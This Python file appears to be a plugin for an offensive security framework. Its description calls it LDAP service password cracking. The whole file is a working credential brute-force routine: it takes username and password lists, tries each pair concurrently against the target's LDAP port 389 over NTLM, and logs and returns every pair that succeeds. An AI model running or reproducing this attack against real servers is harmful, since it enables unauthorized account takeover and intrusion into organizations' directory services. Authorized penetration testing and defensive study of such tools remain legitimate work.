# -*-* coding:UTF-8
import os
from ldap3 import Server, Connection, ALL


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ldap服务口令破解",
        "datetime": "2022-01-02"
    }

    def ip(self) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for username, password in self.build_login_dict(
                    method=self.target.args.method,
                    username=self.target.args.username or os.path.join('data', 'ldap_username'),
                    password=self.target.args.password or os.path.join('data', 'ldap_password'),
            ):
                execute.submit(self.task, username, password)
            return {'LoginInfo': execute.result()}

    async def task(self, username, password):
        self.log.debug(f'Login => username: {username}, password: {password}')
        server = Server(
            host=self.target.value,
            port=389,
            use_ssl=False,
            connect_timeout=self.target.args.timeout,
            get_info='ALL'
        )
        conn = Connection(
            server,
            user=username,
            password=password,
            check_names=True,
            lazy=False,
            auto_bind=True,
            receive_timeout=self.target.args.timeout,
            authentication="NTLM"
        )
        conn.unbind()
        server.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 389,
            'server': 'ldap',
            'username': username,
            'password': password
        }
